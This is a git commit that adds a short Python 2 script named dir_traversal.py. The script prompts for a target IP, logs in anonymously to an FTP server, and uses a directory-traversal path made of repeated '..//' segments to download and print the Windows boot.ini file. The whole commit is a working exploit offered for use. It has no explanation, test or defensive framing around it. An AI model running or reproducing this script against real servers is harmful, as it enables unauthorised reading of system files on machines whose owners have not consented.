a7226ffb819ec8de90abcc4749e560a9d2ea02af
JT <shipcodez@gmail.com>
2015-10-21 06:51:21 +0800

    Create dir_traversal.py

---
+++ ftp/dir_traversal.py
@@ -0,0 +1,11 @@
+from ftplib import FTP
+ 
+ftp = FTP(raw_input("Target IP: ")) 
+ftp.login()                   
+ftp.retrbinary('RETR ..//..//..//..//..//..//..//..//..//..//..//boot.ini', open('boot.ini.txt', 'wb').write)
+ftp.close()
+file = open('boot.ini.txt', 'r')
+print "[**] Printing what's inside boot.ini\n"
+print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+print file.read()
+print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
